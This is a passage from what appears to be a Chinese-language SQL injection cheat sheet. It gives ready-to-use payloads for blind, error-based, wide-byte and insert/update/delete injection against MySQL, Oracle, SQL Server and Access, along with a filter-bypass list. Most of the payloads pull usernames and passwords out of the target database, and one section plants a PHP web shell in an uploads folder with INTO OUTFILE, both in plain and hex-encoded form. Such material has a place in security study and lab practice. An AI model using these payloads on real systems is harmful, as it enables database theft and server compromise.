class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27; name &#x27;</span> <span class="keyword">and</span> table_schema <span class="operator">=</span> <span class="string">&#x27; name &#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># 同理步骤 <span class="number">3</span></span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="operator">&lt;</span>schema<span class="operator">&gt;</span>.<span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># <span class="operator">&lt;</span>schema<span class="operator">&gt;</span>.<span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span>：填库名和表名</span><br></pre></td></tr></table></figure>
</li>
<li><p>相关函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 长度</span><br><span class="line">length(str)</span><br><span class="line"># 对str从第m字符开始向后截取n个字符（<span class="number">1</span>开始计数）</span><br><span class="line"><span class="built_in">substring</span>(str,m,n)</span><br><span class="line"># c 的 ascii 码</span><br><span class="line">ascii(c)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="2-4-时间盲注"><a href="#2-4-时间盲注" class="headerlink" title="2.4 时间盲注"></a>2.4 时间盲注</h4><ul>
<li><p>时间盲注</p>
<blockquote>
<p>注入无返回结果或唯一返回结果时使用，依照睡眠时间判断为真还是为假。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、数据库长度</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep (if(length((<span class="keyword">select</span> database()))<span class="operator">=</span><span class="number">10</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试出长度</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">116</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&lt;</span><span class="number">101</span>,<span class="number">0</span>,<span class="number">5</span>)))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">&lt;</span><span class="number">101</span>,<span class="number">0</span>,<span class="number">5</span>)))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> username <span class="keyword">from</span><span class="operator">&lt;</span><span class="keyword">table</span><span class="operator">&gt;</span>.<span class="operator">&lt;</span><span class="keyword">column</span><span class="operator">&gt;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">69</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="operator">%</span><span class="number">23</span></span><br><span class="line"># 试</span><br></pre></td></tr></table></figure>
</li>
<li><p>相关函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 睡眠</span><br><span class="line">sleep(<span class="type">time</span>)</span><br><span class="line"># 三木运算符，条件，为真，为假。</span><br><span class="line">if(<span class="keyword">condition</span>,<span class="literal">true</span>,<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="2-5-floor盲注"><a href="#2-5-floor盲注" class="headerlink" title="2.5 floor盲注"></a>2.5 floor盲注</h4><ul>
<li><p>floor盲注</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 改变 limit 的第一个值来获得不同的库名，表名，列名</span><br><span class="line"># <span class="number">1</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ( <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat (database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ( <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>) <span class="operator">*</span> <span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x3a</span>,<span class="built_in">floor</span>( rand(<span class="number">0</span>) <span class="operator">*</span> <span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure>
</li>
<li><p>相关函数</p>
<blockquote>
<p>原理：floor 注入是 rand 函数在与 group by 子句一起使用时多次计算导致的。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 返回不大于 x 的整数值</span><br><span class="line"><span class="built_in">floor</span>(x)</span><br><span class="line"># (<span class="number">0</span>,<span class="number">1</span>)的随机数（rand() <span class="operator">*</span> <span class="number">2</span> ∈ (<span class="number">0</span>,<span class="number">2</span>)）（用rand(<span class="number">0</span>)保证注入必报错）</span><br><span class="line">rand()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="2-6-XML注入"><a href="#2-6-XML注入" class="headerlink" title="2.6 XML注入"></a>2.6 XML注入</h4><ul>
<li><p>updatexml注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database())),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、值</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>相关函数</p>
<blockquote>
<p>原理：输入的路径不符合格式导致报错，在路径栏中返回报错信息。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 对XML文档进行更新</span><br><span class="line">updatexml( XML_document , XPath_string , new_value )</span><br><span class="line"># String型，是目标XML文档的文件格式。</span><br><span class="line">XML_document</span><br><span class="line"># （XPath格式的字符串）是XML文档路径。</span><br><span class="line">XPath_string</span><br><span class="line"># String型，用于替换查找到的符合条件的数据。</span><br><span class="line">new_value</span><br></pre></td></tr></table></figure>
</li>
<li><p>extractvalue注入</p>
<blockquote>
<p>同理于 updatexml，将 updataxml 改成 extractvalue 即可。</p>
</blockquote>
</li>
</ul>
<h4 id="2-7-宽字节注入"><a href="#2-7-宽字节注入" class="headerlink" title="2.7 宽字节注入"></a>2.7 宽字节注入</h4><ul>
<li><p>宽字节注入</p>
<blockquote>
<p>原理：限字符集包含中文，程序通过 addslashes 函数在引号前会加入 \ ，然后会和前面的编码拼成一个宽字节，引号不会被转义，语句闭合导致注入成功。</p>
<p>可以使用：%81，%df</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">81</span><span class="string">&#x27; and 1=2 union select 1,database(),3 %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 2、表名</span></span><br><span class="line"><span class="string">id=1%81&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="number">0</span>x<span class="operator">&lt;&gt;</span> <span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">81</span><span class="string">&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x&lt;&gt; and table_name=0x&lt;&gt; %23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 4、值</span></span><br><span class="line"><span class="string">id=1%81&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username , <span class="number">0x2a2a2a</span> , password),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">user</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="2-8-增删改注入"><a href="#2-8-增删改注入" class="headerlink" title="2.8 增删改注入"></a>2.8 增删改注入</h4><ul>
<li><p>Insert</p>
<blockquote>
<p>SQL语句中因为insert语句为：<code>INSERT INTO table_name (col_1, col_2,...) VALUES (value_1, value_2,....)</code>。所以可以通过构造语句在value进行操作。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>猜闭合</span><br><span class="line">username<span class="operator">=</span>xixi<span class="string">&#x27;,&#x27;</span><span class="number">111</span><span class="string">&#x27;) #</span></span><br><span class="line"><span class="string"># 如果报错列数不对，说明是引号闭合，但是列数不对，继续添加数据猜列数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 2.库名（任一）</span></span><br><span class="line"><span class="string">username=xixi&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">username=xixi&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">and</span> <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;22&#x27;</span>,<span class="string">&#x27;33&#x27;</span>,<span class="string">&#x27;44&#x27;</span>,<span class="string">&#x27;55&#x27;</span>,<span class="string">&#x27;66&#x27;</span>)#</span><br><span class="line"># 第一个语句的最后的单引号是为了闭合引号</span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>表名</span><br><span class="line">username<span class="operator">=</span> <span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) or &#x27;</span></span><br><span class="line"># 修改substr的第二个参数获得不同表名</span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span>列名</span><br><span class="line">username<span class="operator">=</span> <span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),1,31),0x7e),1) or &#x27;</span></span><br><span class="line"># 修改substr的第二个参数获得不同列名</span><br><span class="line"></span><br><span class="line"># <span class="number">5.</span>数据</span><br><span class="line">username<span class="operator">=</span> <span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;</span>;<span class="string">&#x27;,password)) from users),1,31),0x7e),1) or &#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Update</p>
<blockquote>
<p>同理于Insert：<code>UPDATE table_name SET col_name = new_value WHERE col_name = value</code></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>猜闭合</span><br><span class="line">sex<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"># 一个单引号报错两个不报错则为单引号闭合</span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span>库名</span><br><span class="line">sex<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 3.表名</span></span><br><span class="line"><span class="string">sex=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span>列名</span><br><span class="line">sex<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),1,31),0x7e),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 5.数据</span></span><br><span class="line"><span class="string">sex=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(concat(username,<span class="string">&#x27;^&#x27;</span>,password)) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br></pre></td></tr></table></figure>
</li>
<li><p>Delete</p>
<blockquote>
<p>同理于Insert：<code>DELETE FROM table_name WHERE col_name = value</code></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1.</span>库名</span><br><span class="line">id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br><span class="line"></span><br><span class="line"># <span class="number">2.</span>表名</span><br><span class="line">id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br><span class="line"></span><br><span class="line"># <span class="number">3.</span>列名</span><br><span class="line">id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br><span class="line"></span><br><span class="line"># <span class="number">4.</span>数据</span><br><span class="line">id<span class="operator">=</span><span class="number">59</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,substr((<span class="keyword">select</span> group_concat(concat(username,<span class="string">&#x27;^&#x27;</span>,password)) <span class="keyword">from</span> users),<span class="number">1</span>,<span class="number">31</span>),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="3-Oracle注入"><a href="#3-Oracle注入" class="headerlink" title="3 Oracle注入"></a>3 Oracle注入</h3><ul>
<li><p>数据库</p>
<ul>
<li><p>数据字典存在 SYSTEM 与 SYSAUX 表空间内的若干段中。</p>
</li>
<li><p>数据表</p>
<p><code>select table_name , tablespace_name from user_tables</code></p>
</li>
<li><p>表列</p>
<p><code>select table_name , column_name from user_tab_columns</code></p>
</li>
<li><p>dual表</p>
<p><code>select SYS_CONTEXT( &#39;USERENV&#39; , &#39;CURRENT_USER&#39; ) from dual</code> （属于 sys 模式，所有用户均可访问）</p>
</li>
</ul>
</li>
<li><p>联合注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、注入点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"># <span class="number">2</span>、列数</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span></span><br><span class="line"># <span class="number">3</span>、报错点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span> <span class="keyword">from</span> dual</span><br><span class="line"># <span class="number">4</span>、当前数据库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,SYS_CONTEXT( <span class="string">&#x27;USERENV&#x27;</span> , <span class="string">&#x27;CURRENT_USER&#x27;</span> ) <span class="keyword">from</span> dual</span><br><span class="line"># <span class="number">5</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,table_name <span class="keyword">from</span> user_tables</span><br><span class="line"># <span class="number">6</span>、列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,column_name <span class="keyword">from</span> user_tab_columns</span><br><span class="line"># <span class="number">7</span>、数据</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,&quot;username&quot;,&quot;passwiord&quot; <span class="keyword">from</span> &quot;user&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># <span class="number">1</span>、当前用户的信息</span><br><span class="line"><span class="keyword">select</span> SYS_CONTEXT( <span class="string">&#x27;USERENV&#x27;</span> , <span class="string">&#x27;CURRENT_USER&#x27;</span> ) <span class="keyword">from</span> dual </span><br><span class="line"># <span class="number">2</span>、当前用户权限</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> session_roles</span><br><span class="line"># <span class="number">3</span>、数据库版本</span><br><span class="line"><span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$vsersion <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="4-SQL-Server注入"><a href="#4-SQL-Server注入" class="headerlink" title="4 SQL Server注入"></a>4 SQL Server注入</h3><ul>
<li><p>数据库</p>
<ul>
<li>sysdatabases：相关数据库信息</li>
<li>sysobjects：数据库中的对象信息</li>
<li>syscolumns：列名</li>
</ul>
</li>
<li><p>报错注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="number">1</span>、数据库名：</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> ( <span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sys.databases ) <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> db_name() <span class="operator">&gt;</span> <span class="number">0</span></span><br><span class="line">#<span class="number">2</span>、表名</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> <span class="number">0</span> <span class="operator">&lt;</span> (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sec.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span>)</span><br><span class="line">#<span class="number">3</span>、列名</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> <span class="number">0</span> <span class="operator">&lt;</span> (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sec.dbo.syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> sec.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;eims_User&#x27;</span>))</span><br><span class="line">#<span class="number">4</span>、值</span><br><span class="line">SortID<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ItemID<span class="operator">=</span><span class="number">46</span> <span class="keyword">and</span> <span class="number">0</span> <span class="operator">&lt;</span> (<span class="keyword">select</span> top <span class="number">1</span> item1 <span class="keyword">from</span> sec.dbo.eims_User)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="5-Access注入"><a href="#5-Access注入" class="headerlink" title="5 Access注入"></a>5 Access注入</h3><ul>
<li><p>爆破注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、猜表名</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> TableName)</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、猜列名</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> ColumnName <span class="keyword">from</span> TableName)</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、列数</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">7</span></span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、报错点</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> TableName</span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、数据</span><br><span class="line">Id<span class="operator">=</span><span class="number">130</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,ColumnName,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> TableName</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="6-复杂注入"><a href="#6-复杂注入" class="headerlink" title="6 复杂注入"></a>6 复杂注入</h3><h4 id="6-1-二次注入"><a href="#6-1-二次注入" class="headerlink" title="6.1 二次注入"></a>6.1 二次注入</h4><blockquote>
<p>原理：首次注入时因为存在字符转义，无法注入成功，但是该数据会存入数据库中。第二次需要用到数据时，数据会从数据库中取出，由于取出的时候没有做过滤，导致注入代码会成功执行。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 案例</span><br><span class="line">#注册用户界面：</span><br><span class="line">用户名：ctfs<span class="string">&#x27; or updatexml(1,concat(0x7e,(version())),0)%23  &amp;&amp;  密码：123456  &amp;&amp; 邮箱：ctfs@ctfs.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#找回密码界面ctfs@ctfs.com</span></span><br><span class="line"><span class="string">#数据库做的操作如下，因为用户名被成功存入。</span></span><br><span class="line"><span class="string">select * from users where username = &#x27;</span>ctfs<span class="string">&#x27; or updatexml(1,concat(0x7e,(version())),0)%23</span></span><br></pre></td></tr></table></figure>
<h4 id="6-2-堆叠注入"><a href="#6-2-堆叠注入" class="headerlink" title="6.2 堆叠注入"></a>6.2 堆叠注入</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.bbsmax.com/A/B0zqoY7K5v/">堆叠注入</a></p>
</blockquote>
<h4 id="6-3-注入后门"><a href="#6-3-注入后门" class="headerlink" title="6.3 注入后门"></a>6.3 注入后门</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span><span class="operator">&lt;</span>?php assert($_POST[a]);?<span class="operator">&gt;</span><span class="string">&#x27; into outfile &#x27;</span>.<span class="operator">/</span>hackable<span class="operator">/</span>uploads<span class="operator">/</span>sh.php<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">0x3c3f7068702061737365727428245f504f53545b615d293b3f3e</span> <span class="keyword">into</span> outfile <span class="string">&#x27;./hackable/uploads/sh.php&#x27;</span>#</span><br></pre></td></tr></table></figure>
<h3 id="7-sqlmap"><a href="#7-sqlmap" class="headerlink" title="7 sqlmap"></a>7 sqlmap</h3><blockquote>
<p><a href=".\c5fc2764">text::Kali Linux</a></p>
</blockquote>
<h3 id="8-SQL注入绕过"><a href="#8-SQL注入绕过" class="headerlink" title="8 SQL注入绕过"></a>8 SQL注入绕过</h3><h4 id="8-1-空格"><a href="#8-1-空格" class="headerlink" title="8.1 空格"></a>8.1 空格</h4><ol>
<li>/**/</li>
<li>制表符：%09</li>
<li>换行符：%0a</li>
<li>小括号：(username)</li>
<li>反引号：`</li>
</ol>
